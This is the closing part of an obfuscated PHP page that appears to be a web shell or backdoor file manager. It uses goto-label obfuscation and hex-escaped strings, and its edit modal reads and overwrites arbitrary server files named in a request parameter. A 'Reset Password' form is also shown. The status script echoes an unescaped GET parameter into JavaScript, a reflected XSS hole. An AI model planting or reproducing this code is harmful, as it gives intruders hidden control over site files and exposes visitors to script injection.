                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button type="submit" class="btn btn-primary">Reset Password</button>
                </div>
            </form>
        </div>
    </div>
</div>

<?php goto opet_0d3e0; opet_0d3e0: if($action === "\x65\144\x69\164" && $target): ?>
<div class="modal fade show" style="display: block;">
    <div class="modal-dialog modal-lg">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Edit: <?= htmlspecialchars($target) ?></h5>
                <button type="button" class="btn-close" onclick="history.back()"></button>
            </div>
            <form method="post">
                <div class="modal-body">
                    <textarea name="content" class="form-control" style="height: 400px; font-family: monospace;"><?= htmlspecialchars(file_get_contents(PATH.'/'.$target)) ?></textarea>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" onclick="history.back()">Cancel</button>
                    <button type="submit" name="save" class="btn btn-primary">Save</button>
                </div>
            </form>
        </div>
    </div>
</div>
<div class="modal-backdrop fade show"></div>
<?php goto opet_0d3e5; opet_0d3e5: endif; ?>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script>
<?php goto opet_0d3fa; opet_0d3fa: if(isset($_GET["\x73\164\x61\164\x75\163"])): ?>
const status = '<?= $_GET['status'] ?>';
const message = status === 'success' ? 'Operation complete successfully' : 'Operation failed';
const alertClass = status === 'success' ? 'alert-success' : 'alert-danger';

const alert = document.createElement('div');
alert.className = `alert ${alertClass} alert-dismissible fade show`;
alert.innerHTML = `
    ${message}
    <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
`;

document.querySelector('.container-fluid').insertBefore(alert, document.querySelector('.breadcrumb'));

setTimeout(() => alert.remove(), 3000);
<?php goto opet_0d3fc; opet_0d3fc: endif; ?>
</script>

</body>
</html>
